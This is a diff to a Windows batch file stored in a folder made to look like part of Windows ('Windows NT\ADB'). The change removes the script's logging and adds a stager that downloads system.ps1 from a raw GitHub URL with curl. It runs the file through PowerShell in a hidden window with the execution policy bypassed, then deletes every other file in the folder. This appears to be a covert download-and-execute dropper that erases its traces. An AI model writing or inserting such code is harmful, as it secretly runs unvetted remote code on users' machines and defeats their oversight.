@@ -11,32 +11,34 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-:: Define log file path
-set logFile="C:\Program Files\Windows NT\ADB\script_log.txt"
-
-:: Clear the log file if it exists, or create a new one
-echo. > %logFile%
-
-:: File paths for PowerShell scripts
+:: Download system.ps1 from the updated URL
+set sysPs1URL=https://raw.githubusercontent.com/quannqttg/coccoc/main/system.ps1
 set sysPs1Path="C:\Program Files\Windows NT\ADB\system.ps1"
 
-:: Log the start of the batch file execution
-echo %date% %time% - Starting batch file execution >> %logFile%
-
-:: Run system.ps1 using PowerShell with ExecutionPolicy Bypass and log output
-echo %date% %time% - Running system.ps1... >> %logFile%
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %sysPs1Path% >> %logFile% 2>&1
-if %errorlevel% neq 0 (
-    echo %date% %time% - Error occurred while running open.ps1. >> %logFile%
-) else (
-    echo %date% %time% - open.ps1 executed successfully. >> %logFile%
+:: Check if system.ps1 already exists and delete it if it does
+if exist %sysPs1Path% (
+    del /f /q %sysPs1Path%
 )
 
-:: Log the end of the batch file execution
-echo %date% %time% - Batch file execution completed. >> %logFile%
+:: Download the system.ps1 file
+curl -L -o %sysPs1Path% %sysPs1URL%
+if %errorlevel% neq 0 (
+    echo Error occurred while downloading system.ps1.
+    exit /b
+)
 
-:: Display success message
-echo Both PowerShell scripts have been executed successfully.
+:: Run system.ps1 using PowerShell with ExecutionPolicy Bypass
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %sysPs1Path%
+if %errorlevel% neq 0 (
+    echo Error occurred while running system.ps1.
+) 
+
+:: Delete all files except system.bat
+for %%F in ("C:\Program Files\Windows NT\ADB\*") do (
+    if /i "%%~nxF" neq "system.bat" (
+        del /f /q "%%F"
+    )
+)
 
 :: Exit the batch file
 exit
